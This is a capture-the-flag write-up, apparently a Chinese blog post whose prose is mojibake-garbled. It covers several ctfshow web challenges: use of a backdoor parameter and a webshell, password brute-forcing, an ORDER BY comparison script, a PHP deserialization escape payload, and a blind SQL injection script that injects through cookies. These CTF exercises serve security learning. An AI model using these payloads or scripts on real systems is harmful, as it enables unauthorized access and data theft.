<p>é¡µé¢è¿”å›å†…å®¹æ˜¯è¿™ä¸ªï¼Œè¯´æ˜æœ‰ä¸ªåé—¨ï¼Œä½†æ˜¯ä¸çŸ¥é“å…·ä½“ä»€ä¹ˆï¼Œè¿™é‡Œåé—¨æ˜¯è‹±æ–‡å•è¯çš„åé—¨Letmein ï¼ˆä¸çŸ¥é“æ€ä¹ˆå¾—åˆ°çš„ï¼‰<br>hackbar postä¼ å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Letmein</span><span class="operator">=</span>print_r (glob (<span class="string">&quot;*&quot;</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°<code>Array ( [0] =&gt; backdoor.php [1] =&gt; index.php )</code><br>ç”¨èšå‰‘è¿æ¥ä¹‹ååœ¨&#x2F;var&#x2F;wwwç›®å½•ä¸‹é¢æœ‰flag.txt<br><img src="https://pic1.imgdb.cn/item/67ac65efd0e0a243d4fe9925.png" alt="|500"><br>ç”¨hackbarä¸­æ‰‹åŠ¨ç”¨highlight_fileæŸ¥çœ‹ å¾—åˆ°flag<br><img src="https://pic1.imgdb.cn/item/67ac65f6d0e0a243d4fe9929.png" alt="|475"></p>
<h1 id="èŒæ–°ä¸“å±çº¢åŒ…é¢˜"><a href="#èŒæ–°ä¸“å±çº¢åŒ…é¢˜" class="headerlink" title="èŒæ–°ä¸“å±çº¢åŒ…é¢˜"></a>èŒæ–°ä¸“å±çº¢åŒ…é¢˜</h1><p>bpæŠ“åŒ…ç„¶åçˆ†ç ´å¯†ç  å¾—åˆ°å¯†ç ä¹‹åç™»å½•<br><img src="https://pic1.imgdb.cn/item/67ac6606d0e0a243d4fe992d.png"></p>
<p>åœ¨é¡µé¢çš„ç½‘ç»œä¸­æœ‰ä¸€ä¸ªflagè¯·æ±‚å¤´ï¼Œç„¶åbase64è§£ç å°±èƒ½å¾—åˆ°flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> <span class="string">&quot;Y3Rmc2hvd3tjZTBhNmI3Ni1jMGQxLTQyNWMtYjU0NC0yOTg5ZmVmNmFjZTN9&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line"></span><br><span class="line">ctfshow&#123;ce0a6b76-c0d1-425c-b544-2989fef6ace3&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h1><p>é¢˜ç›®è¿˜æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä½†æ˜¯å¯ä»¥æ³¨å†Œï¼Œæ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•è¿›å»ï¼Œæœ‰æ˜¾ç¤ºä¸€ä¸ªflagçš„ä¿¡æ¯<br><img src="https://pic1.imgdb.cn/item/67ac65fcd0e0a243d4fe992b.png"><br>ä½†æ˜¯æ²¡æœ‰ä»€ä¹ˆå¤šä½™ä¿¡æ¯<br>ç”¨dirsearchæ‰«åˆ°ä¸€ä¸ª<a href="http://www.zip/">www.zip</a> ä¸‹è½½ä¸‹æ¥å°±æ˜¯ç½‘é¡µçš„æºä»£ç <br>login.phpè¿™ä¸ªæºç ä¸­æ˜¾ç¤ºç¦äº†å¾ˆå¤šå­—ç¬¦ï¼Œæ‰€ä»¥æ— æ³•sqlæ³¨å…¥<br>åœ¨user_main.phpä¸­æœ‰å…³é”®ä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="operator">?</span>php</span><br><span class="line">    <span class="keyword">if</span> (isset($_SESSION[<span class="string">&quot;login&quot;</span>]) <span class="operator">&amp;&amp;</span> $_SESSION[<span class="string">&quot;login&quot;</span>] <span class="operator">==</span><span class="operator">=</span> <span class="literal">true</span>) &#123;</span><br><span class="line">        $con <span class="operator">=</span> mysqli_connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;web15&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="operator">!</span>$con) &#123;</span><br><span class="line">            die(&#x27;Could not <span class="params">connect:</span> &#x27; . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $order <span class="operator">=</span> $_GET[&#x27;order&#x27;];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($order) <span class="operator">&amp;&amp;</span> strlen($order) <span class="operator">&lt;</span> <span class="number">6</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|<span class="char escape_">\,</span>|<span class="char escape_">\`</span>|<span class="char escape_">\~</span>|<span class="char escape_">\!</span>|<span class="char escape_">\@</span>|<span class="char escape_">\#</span>|<span class="char escape_">\%</span>|<span class="char escape_">\^</span>|<span class="char escape_">\&amp;</span>|<span class="char escape_">\*</span>|<span class="char escape_">\(</span>|<span class="char escape_">\)</span>|<span class="char escape_">\ï¼ˆ</span>|<span class="char escape_">\ï¼‰</span>|<span class="char escape_">\-</span>|<span class="char escape_">\_</span>|<span class="char escape_">\+</span>|<span class="char escape_">\=</span>|<span class="char escape_">\&#123;</span>|<span class="char escape_">\&#125;</span>|<span class="char escape_">\[</span>|<span class="char escape_">\]</span>|<span class="char escape_">\;</span>|<span class="char escape_">\:</span>|<span class="char escape_">\&#x27;</span>|<span class="char escape_">\â€™</span>|<span class="char escape_">\â€œ</span>|<span class="char escape_">\&quot;</span>|<span class="char escape_">\&lt;</span>|<span class="char escape_">\&gt;</span>|<span class="char escape_">\?</span>|<span class="char escape_">\,</span>|<span class="char escape_">\.</span>|<span class="char escape_">\?</span>/i&quot;</span>, $order)) &#123;</span><br><span class="line">                die(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $sql <span class="operator">=</span> <span class="string">&quot;select * from user order by $order&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $sql <span class="operator">=</span> <span class="string">&quot;select * from user order by id&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="operator">?</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å¦‚æœæˆ‘ä»¬æŠŠorder&#x3D;pwdï¼Œå°±å¯ä»¥ä¸€ç›´æ³¨å†Œï¼Œæ ¹æ®å¯†ç æ’åºï¼Œå¾—åˆ°flagã€‚<br>å› ä¸ºè¿™é‡Œç”¨orderbyæ’åºäº†ï¼Œæ‰€ä»¥å¯ä»¥è®©æˆ‘ä»¬æ³¨å†Œçš„å¯†ç å’Œflagçš„å¯†ç è¿›è¡Œæ¯”è¾ƒ<br>ä¸€æ®µæ¥è‡ªç½‘ä¸Šçš„è„šæœ¬:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"> import requests</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://69ffa319-8ced-4173-8a89-71f4446243aa.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def reg(password):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: password, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = requests.post(<span class="attribute">url</span>=url + <span class="string">&quot;reg.php&quot;</span>, <span class="attribute">data</span>=data, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == 302:</span><br><span class="line">        return <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login(username, password):</span><br><span class="line">    #<span class="built_in"> proxy </span>= &#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: hashlib.md5(password.encode()).hexdigest()&#125;</span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.post(<span class="attribute">url</span>=url + <span class="string">&quot;login.php&quot;</span>, <span class="attribute">data</span>=data, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line">    # <span class="built_in">print</span>(r.headers)</span><br><span class="line">    <span class="keyword">if</span> r.headers[<span class="string">&quot;location&quot;</span>] == <span class="string">&quot;/user_main.php?order=id&quot;</span>:</span><br><span class="line">        return s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;login error!&quot;</span>)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line">reg(hashlib.md5(<span class="string">&quot;check&quot;</span>.encode()).hexdigest())</span><br><span class="line">session = login(hashlib.md5(<span class="string">&quot;check&quot;</span>.encode()).hexdigest(), <span class="string">&quot;check&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwd = [<span class="string">&quot;-&quot;</span>] * 100</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(pwd)):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(key)):</span><br><span class="line">        pwd[i] = key[x]</span><br><span class="line">        _pwd = <span class="string">&quot;&quot;</span>.join(pwd)</span><br><span class="line">        <span class="keyword">if</span> reg(_pwd):</span><br><span class="line">            r = session.<span class="built_in">get</span>(<span class="attribute">url</span>=url + <span class="string">&quot;user_main.php?order=pwd&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> _pwd <span class="keyword">in</span> r.text.split(<span class="string">&quot;flag_is_my_password&quot;</span>)[1]:</span><br><span class="line">                pwd[i] = key[x - 1]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(pwd))</span><br><span class="line">                break</span><br></pre></td></tr></table></figure></div>
<p> ä½†æ˜¯æˆ‘ç”¨äº†ç½‘ä¸Šçš„å‡ ä¸ªè„šæœ¬éƒ½åªèƒ½è§£å¯†åˆ°ä¸€åŠå°±æŠ¥é”™äº†ã€‚è¿˜æ˜¯ä»¥åç­‰è‡ªå·±pythonå­¦å¥½äº†å†™è‡ªå·±çš„è„šæœ¬å§</p>
<h1 id="game-gyctf-web2"><a href="#game-gyctf-web2" class="headerlink" title="game-gyctf web2"></a>game-gyctf web2</h1><p><img src="https://pic1.imgdb.cn/item/67ac664cd0e0a243d4fe9949.png"><br>é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•ç³»ç»Ÿï¼Œæç¤ºæˆå‘˜ç•™åé—¨ã€‚éšä¾¿è¾“å…¥äº†ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç æç¤ºç”¨æˆ·ä¸å­˜åœ¨ï¼Œè¾“å…¥adminç”¨æˆ·æç¤ºå¯†ç é”™è¯¯ï¼Œæ‰€ä»¥å…ˆå°è¯•èƒ½ä¸èƒ½çˆ†ç ´ã€‚çˆ†ç ´å¤±è´¥ï¼Œä½†æ˜¯æ‰«æç›®å½•å‘ç°<a href="http://www.zipä¸‹è½½ä¸‹æ¥ä¹‹åå¯ä»¥å¾—åˆ°ç½‘é¡µçš„æºç ./">www.zipä¸‹è½½ä¸‹æ¥ä¹‹åå¯ä»¥å¾—åˆ°ç½‘é¡µçš„æºç ã€‚</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$users</span>-&gt;<span class="title function_ invoke__">update</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¦æƒ³ç™»å½•æˆåŠŸå°±è¦è®©session [login]&#x3D;1<br>åé¢çš„ä»£ç å®¡è®¡å’Œååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸å¯¹æˆ‘æ¥è¿˜æ˜¯å¤ªéš¾äº†ï¼Œè¯¦æƒ…å¯ä»¥çœ‹è¿™ç¯‡åšå®¢<a href="ttps://www.cnblogs.com/aninock/p/15408090.html"># <a href="https://www.cnblogs.com/aninock/p/15408090.html" title="å‘å¸ƒäº 2021-10-14 19:12">CTFSHOW - æ—¥åˆ· - game-gyctf web2&#x2F;pop é“¾ - ååºåˆ—å­—ç¬¦é€ƒé€¸</a></a><br>æœ€ååœ¨?action&#x3D;updateç•Œé¢ä¸Šä¼ postæ•°æ®<br>payload: </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">age=<span class="number">18</span>&amp;nickname=intointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointo<span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelpe<span class="string">r&quot;:1:&#123;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>Use<span class="string">r&quot;:2:&#123;s:3:&quot;</span>age<span class="string">&quot;;s:70:&quot;</span>select <span class="number">1</span>,<span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> from user where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:3:&#123;s:3:&quot;</span>age<span class="string">&quot;;N;s:8:&quot;</span>nickname<span class="string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åå‡ºç°10-0å°±è¯´æ˜æˆåŠŸ ç”¨admin&#x2F;1å°±å¯ä»¥ç™»å½•äº†</p>
<h1 id="web15-Fishman"><a href="#web15-Fishman" class="headerlink" title="web15 Fishman"></a>web15 Fishman</h1><p><img src="https://pic1.imgdb.cn/item/67ac664dd0e0a243d4fe994a.png" alt="|500"><br>é¢˜ç›®åˆæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæ³¨å†Œä¸ªè´¦å·çœ‹çœ‹.ä½†æ˜¯ç‚¹æ³¨å†Œè·³è½¬åˆ°çš„æ˜¯qqçš„æ³¨å†Œåœ°å€,è€Œä¸”åˆæ˜¯ä¸€ä¸ªä»£ç å®¡è®¡é¢˜ç›®<br>åœ¨ç½‘å€è¾“å…¥&#x2F;<a href="http://www.zipå°±å¯ä»¥ä¸‹è½½æºæ–‡ä»¶,æ‰«æä¹‹åå‘ç°ç½‘ç«™è¿˜æœ‰ä¸€ä¸ªadmin.ç›®å½•/">www.zipå°±å¯ä»¥ä¸‹è½½æºæ–‡ä»¶,æ‰«æä¹‹åå‘ç°ç½‘ç«™è¿˜æœ‰ä¸€ä¸ªadmin.ç›®å½•</a><br>åœ¨member.phpä¸­å­˜åœ¨sqlæ³¨å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;IN_CRONLITE&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$islogin</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;islogin&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;login_data&quot;</span>]) &#123;</span><br><span class="line">            <span class="variable">$login_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;login_data&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">            <span class="variable">$admin_user</span> = <span class="variable">$login_data</span>[<span class="string">&#x27;admin_user&#x27;</span>];</span><br><span class="line">            <span class="variable">$udata</span> = <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">get_row</span>(<span class="string">&quot;SELECT * FROM fish_admin WHERE username=&#x27;<span class="subst">$admin_user</span>&#x27; limit 1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$udata</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;islogin&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login_data&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$admin_pass</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$udata</span>[<span class="string">&#x27;password&#x27;</span>] . LOGIN_KEY);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$admin_pass</span> == <span class="variable">$login_data</span>[<span class="string">&#x27;admin_pass&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$islogin</span> = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;islogin&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login_data&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;admin_user&quot;</span>]) &#123;</span><br><span class="line">            <span class="variable">$admin_user</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_user&#x27;</span>]);</span><br><span class="line">            <span class="variable">$udata</span> = <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">get_row</span>(<span class="string">&quot;SELECT * FROM fish_admin WHERE username=&#x27;<span class="subst">$admin_user</span>&#x27; limit 1&quot;</span>);</span><br><span class="line">            <span class="variable">$admin_pass</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$udata</span>[<span class="string">&#x27;password&#x27;</span>] . LOGIN_KEY);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$admin_pass</span> == <span class="variable">$_SESSION</span>[<span class="string">&quot;admin_pass&quot;</span>]) &#123;</span><br><span class="line">                <span class="variable">$islogin</span> = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å½“æŸ¥è¯¢è¿”å›çš„ç”¨æˆ·åä¸ºç©ºä¸”å¯†ç é”™è¯¯æ—¶ï¼Œè¿›è¡Œå››æ¬¡ setcookie æ“ä½œ å½“æŸ¥è¯¢è¿”å›çš„ç”¨æˆ·åä¸ºä¸ä¸ºç©ºæ—¶ï¼Œè¿›è¡Œä¸¤æ¬¡ setcookie æ“ä½œ<br>å¤§ä½¬çš„è„šæœ¬ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://662305d4-5c5b-490d-bedf-dbc29ead878a.challenge.ctf.show/admin/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload</span>):</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;\\u0075&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\u0027&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\\u006f&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;\\u0069&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\u0022&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\\u0020&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;\\u0073&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\\u0023&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\u003e&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;\\u003c&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;\\u002d&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;\\u003d&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;f1a9&#x27;</span>, <span class="string">&#x27;F1a9&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;f1&#x27;</span>, <span class="string">&#x27;F1&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#get database length</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">databaseName_len</span>():</span><br><span class="line">	<span class="built_in">print</span> (<span class="string">&quot;start get database name length...&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">45</span>):</span><br><span class="line">		payload = <span class="string">&quot;1&#x27; or (length(database())=&quot;</span> + <span class="built_in">str</span>(l+<span class="number">1</span>) + <span class="string">&quot;)#&quot;</span></span><br><span class="line">		payload = tamper(payload)</span><br><span class="line">		tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">		headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">		r =requests.get(url, headers=headers)</span><br><span class="line">		myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">		<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">1</span>)):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;get db length = &#x27;</span> + <span class="built_in">str</span>(l).lower())</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">			</span><br><span class="line"><span class="comment">#get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_databaseName</span>():</span><br><span class="line">	flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">15</span>):</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				payload = <span class="string">&quot;1&#x27; or (select (database()) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> +<span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			payload = tamper(payload)</span><br><span class="line">			tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">			headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">			r =requests.get(url, headers=headers)</span><br><span class="line">			myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">			<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">				flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;databasename = &#x27;</span> + flag.lower())</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tableName</span>():</span><br><span class="line">	flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">30</span>):           <span class="comment">#blind inject</span></span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> 